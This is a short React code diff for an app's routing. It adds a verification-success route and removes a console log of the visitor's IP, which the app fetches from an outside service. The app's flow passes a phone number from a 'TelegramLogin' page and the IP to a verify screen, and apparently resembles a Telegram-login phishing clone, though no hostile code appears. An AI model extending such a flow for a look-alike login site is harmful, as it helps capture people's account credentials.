@@ -4,6 +4,7 @@ import AuthScreen from './components/verify'
 import { BrowserRouter as Router, Routes, Route } from "react-router-dom";
 import { ToastContainer } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
+import VerificationSuccess from './components/success';
 
 function App() {
   const [phone, setPhone] = useState("")
@@ -15,7 +16,7 @@ function App() {
       .then((data) => setIp(data.ip))
       .catch((error) => console.error("Error fetching IP:", error));
   }, []);
-  console.log(ip)
+
 
   return (
     <>
@@ -24,6 +25,7 @@ function App() {
         <Routes>
           <Route path="/" element={<TelegramLogin setPhone={setPhone} />} />
           <Route path="/verify" element={<AuthScreen phone={phone} IP={ip} />} />
+          <Route path="/success" element={<VerificationSuccess />} />
         </Routes>
       </Router >
     </>
